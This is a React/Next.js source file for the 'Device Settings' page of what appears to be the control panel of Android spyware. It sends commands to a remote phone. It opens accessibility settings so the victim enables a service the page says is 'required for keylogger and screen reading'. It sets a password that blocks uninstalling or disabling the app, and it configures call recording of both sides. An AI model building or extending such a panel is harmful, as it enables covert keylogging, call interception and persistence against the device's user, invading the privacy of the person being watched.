'use client';

import { useEffect, useState, Suspense } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import Sidebar from '@/components/layout/Sidebar';
import Header from '@/components/layout/Header';
import { dispatchCommand, getCommandHistory } from '@/lib/api';
import { useAuthStore } from '@/lib/store';
import {
    ArrowLeft,
    Shield,
    Lock,
    Volume2,
    RefreshCw,
    CheckCircle,
    Settings,
    Accessibility,
    Loader2,
    Mic,
    Radio,
} from 'lucide-react';
import Link from 'next/link';

export default function DeviceSettingsPage() {
    return (
        <Suspense fallback={null}>
            <DeviceSettingsContent />
        </Suspense>
    );
}

function DeviceSettingsContent() {
    const router = useRouter();
    const searchParams = useSearchParams();
    const deviceId = searchParams.get('id') as string;
    const { isAuthenticated, isHydrated } = useAuthStore();

    // Protection Password
    const [protectionPassword, setProtectionPassword] = useState('');
    const [passwordLoading, setPasswordLoading] = useState(false);
    const [passwordSuccess, setPasswordSuccess] = useState(false);

    // Recording Settings
    const [recordingQuality, setRecordingQuality] = useState('low');
    const [audioFormat, setAudioFormat] = useState('aac');
    const [audioSource, setAudioSource] = useState('AUTO');
    const [settingsLoading, setSettingsLoading] = useState<string | null>(null);

    // Accessibility
    const [accessibilityLoading, setAccessibilityLoading] = useState(false);

    useEffect(() => {
        if (isHydrated && !isAuthenticated) router.push('/login');
    }, [isHydrated, isAuthenticated, router]);

    const handleSetPassword = async () => {
        if (protectionPassword.length < 4) return;
        setPasswordLoading(true);
        setPasswordSuccess(false);
        try {
            const res = await dispatchCommand(deviceId, 'set_protection_password', { password: protectionPassword });
            if (res.success) {
                setPasswordSuccess(true);
                setProtectionPassword('');
                setTimeout(() => setPasswordSuccess(false), 3000);
            }
        } catch (error) {
            console.error('Failed to set password:', error);
        } finally {
            setPasswordLoading(false);
        }
    };

    const handleSetRecordingQuality = async (quality: string) => {
        setSettingsLoading('quality');
        try {
            const res = await dispatchCommand(deviceId, 'set_recording_quality', { quality });
            if (res.success) setRecordingQuality(quality);
        } catch (error) {
            console.error('Failed to set quality:', error);
        } finally {
            setSettingsLoading(null);
        }
    };

    const handleSetAudioFormat = async (fmt: string) => {
        setSettingsLoading('format');
        try {
            const res = await dispatchCommand(deviceId, 'set_audio_format', { format: fmt });
            if (res.success) setAudioFormat(fmt);
        } catch (error) {
            console.error('Failed to set format:', error);
        } finally {
            setSettingsLoading(null);
        }
    };

    const handleSetAudioSource = async (source: string) => {
        setSettingsLoading('source');
        try {
            const res = await dispatchCommand(deviceId, 'set_audio_source', { source });
            if (res.success) setAudioSource(source);
        } catch (error) {
            console.error('Failed to set source:', error);
        } finally {
            setSettingsLoading(null);
        }
    };

    const handleOpenAccessibilitySettings = async () => {
        if (accessibilityLoading) return;
        setAccessibilityLoading(true);
        try {
            await dispatchCommand(deviceId, 'open_accessibility_settings', {});
        } catch (error) {
            console.error('Failed to open accessibility settings:', error);
        } finally {
            setTimeout(() => setAccessibilityLoading(false), 2000);
        }
    };

    if (!isHydrated || !isAuthenticated) return null;

    return (
        <div className="min-h-screen bg-[var(--bg-base)] pb-20 lg:pb-0">
            <Sidebar />
            <main className="lg:ml-72">
                <Header
                    title="Device Settings"
                    subtitle="Configure device behavior and security"
                />

                <div className="p-4 lg:p-8 max-w-3xl mx-auto animate-fade-in">
                    {/* Back Button */}
                    <Link
                        href={`/devices/view/?id=${deviceId}`}
                        className="inline-flex items-center gap-2 text-[var(--text-muted)] hover:text-[var(--primary)] transition-colors text-sm font-medium mb-6 group"
                    >
                        <div className="w-8 h-8 rounded-lg bg-[var(--bg-subtle)] flex items-center justify-center group-hover:bg-[var(--primary-glow)] transition-colors">
                            <ArrowLeft className="w-4 h-4" />
                        </div>
                        Back to Device
                    </Link>

                    <div className="space-y-6">
                        {/* Accessibility Settings */}
                        <div className="card p-6">
                            <div className="flex items-center gap-4 mb-5">
                                <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center shadow-lg">
                                    <Accessibility className="w-6 h-6 text-white" />
                                </div>
                                <div>
                                    <h3 className="font-bold text-lg text-[var(--text-primary)]">Accessibility Service</h3>
                                    <p className="text-sm text-[var(--text-muted)]">Required for keylogger and screen reading</p>
                                </div>
                            </div>
                            <button
                                onClick={handleOpenAccessibilitySettings}
                                disabled={accessibilityLoading}
                                className="btn btn-secondary w-full"
                            >
                                {accessibilityLoading ? (
                                    <>
                                        <Loader2 className="w-4 h-4 animate-spin" />
                                        Opening Settings...
                                    </>
                                ) : (
                                    <>
                                        <Settings className="w-4 h-4" />
                                        Open Accessibility Settings on Device
                                    </>
                                )}
                            </button>
                            <p className="text-xs text-[var(--text-muted)] mt-3">
                                This will open the accessibility settings on the device so the user can enable the service.
                            </p>
                        </div>

                        {/* Security Settings */}
                        <div className="card p-6">
                            <div className="flex items-center gap-4 mb-5">
                                <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-red-500 to-rose-500 flex items-center justify-center shadow-lg">
                                    <Shield className="w-6 h-6 text-white" />
                                </div>
                                <div>
                                    <h3 className="font-bold text-lg text-[var(--text-primary)]">App Protection</h3>
                                    <p className="text-sm text-[var(--text-muted)]">Set password to protect app from being uninstalled</p>
                                </div>
                            </div>
                            <div>
                                <label className="text-xs font-semibold text-[var(--text-secondary)] mb-2 block">
                                    Protection Password
                                </label>
                                <div className="flex gap-2">
                                    <input
                                        type="password"
                                        value={protectionPassword}
                                        onChange={(e) => setProtectionPassword(e.target.value)}
                                        placeholder="Min 4 characters"
                                        className="input flex-1"
                                    />
                                    <button
                                        onClick={handleSetPassword}
                                        disabled={protectionPassword.length < 4 || passwordLoading}
                                        className={`btn ${passwordSuccess ? 'btn-success' : 'btn-primary'}`}
                                    >
                                        {passwordLoading ? <RefreshCw className="w-4 h-4 animate-spin" /> :
                                            passwordSuccess ? <CheckCircle className="w-4 h-4" /> :
                                                <Lock className="w-4 h-4" />}
                                    </button>
                                </div>
                                <p className="text-xs text-[var(--text-muted)] mt-2">
                                    When set, this password will be required before uninstalling or disabling the app.
                                </p>
                            </div>
                        </div>

                        {/* Recording Settings */}
                        <div className="card p-6">
                            <div className="flex items-center gap-4 mb-5">
                                <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-amber-500 to-yellow-500 flex items-center justify-center shadow-lg">
                                    <Volume2 className="w-6 h-6 text-white" />
                                </div>
                                <div>
                                    <h3 className="font-bold text-lg text-[var(--text-primary)]">Call Recording</h3>
                                    <p className="text-sm text-[var(--text-muted)]">Configure recording quality and format</p>
                                </div>
                            </div>

                            <div className="space-y-5">
                                {/* Quality Selection */}
                                <div>
                                    <label className="text-xs font-semibold text-[var(--text-secondary)] mb-2 block flex items-center gap-2">
                                        <Mic className="w-3.5 h-3.5" />
                                        Recording Quality
                                    </label>
                                    <div className="grid grid-cols-4 gap-2">
                                        {[
                                            { key: 'low', label: 'Low', desc: 'Smallest files' },
                                            { key: 'standard', label: 'Standard', desc: 'Balanced' },
                                            { key: 'high', label: 'High', desc: 'Better clarity' },
                                            { key: 'ultra', label: 'Ultra', desc: 'Best quality' },
                                        ].map((q) => (
                                            <button
                                                key={q.key}
                                                onClick={() => handleSetRecordingQuality(q.key)}
                                                disabled={settingsLoading === 'quality'}
                                                className={`p-3 rounded-xl text-center transition-all ${recordingQuality === q.key
                                                    ? 'bg-[var(--primary)] text-white shadow-lg'
                                                    : 'bg-[var(--bg-subtle)] text-[var(--text-muted)] hover:bg-[var(--primary-glow)] hover:text-[var(--primary)]'
                                                    }`}
                                            >
                                                <span className="font-semibold text-sm block">{q.label}</span>
                                                <span className="text-[10px] opacity-70">{q.desc}</span>
                                            </button>
                                        ))}
                                    </div>
                                </div>

                                {/* Format Selection */}
                                <div>
                                    <label className="text-xs font-semibold text-[var(--text-secondary)] mb-2 block flex items-center gap-2">
                                        <Volume2 className="w-3.5 h-3.5" />
                                        Audio Format
                                    </label>
                                    <div className="flex gap-2">
                                        {[
                                            { key: 'aac', label: 'AAC', desc: 'Recommended' },
                                            { key: 'mp3', label: 'MP3', desc: 'Compatible' },
                                        ].map((f) => (
                                            <button
                                                key={f.key}
                                                onClick={() => handleSetAudioFormat(f.key)}
                                                disabled={settingsLoading === 'format'}
                                                className={`flex-1 p-3 rounded-xl text-center transition-all ${audioFormat === f.key
                                                    ? 'bg-[var(--primary)] text-white shadow-lg'
                                                    : 'bg-[var(--bg-subtle)] text-[var(--text-muted)] hover:bg-[var(--primary-glow)] hover:text-[var(--primary)]'
                                                    }`}
                                            >
                                                <span className="font-semibold text-sm block">{f.label}</span>
                                                <span className="text-[10px] opacity-70">{f.desc}</span>
                                            </button>
                                        ))}
                                    </div>
                                </div>

                                {/* Audio Source Selection */}
                                <div>
                                    <label className="text-xs font-semibold text-[var(--text-secondary)] mb-2 block flex items-center gap-2">
                                        <Radio className="w-3.5 h-3.5" />
                                        Audio Source
                                    </label>
                                    <div className="grid grid-cols-3 gap-2">
                                        {[
                                            { key: 'AUTO', label: 'Auto', desc: 'Best match' },
                                            { key: 'MIC', label: 'Mic', desc: 'Microphone' },
                                            { key: 'VOICE_CALL', label: 'Call', desc: 'Both sides' },
                                        ].map((s) => (
                                            <button
                                                key={s.key}
                                                onClick={() => handleSetAudioSource(s.key)}
                                                disabled={settingsLoading === 'source'}
                                                className={`p-3 rounded-xl text-center transition-all ${audioSource === s.key
                                                    ? 'bg-[var(--primary)] text-white shadow-lg'
                                                    : 'bg-[var(--bg-subtle)] text-[var(--text-muted)] hover:bg-[var(--primary-glow)] hover:text-[var(--primary)]'
                                                    }`}
                                            >
                                                <span className="font-semibold text-sm block">{s.label}</span>
                                                <span className="text-[10px] opacity-70">{s.desc}</span>
                                            </button>
                                        ))}
                                    </div>
                                    <p className="text-xs text-[var(--text-muted)] mt-2">
                                        "Auto" tries VOICE_CALL first, then falls back to MIC if not supported.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    );
}
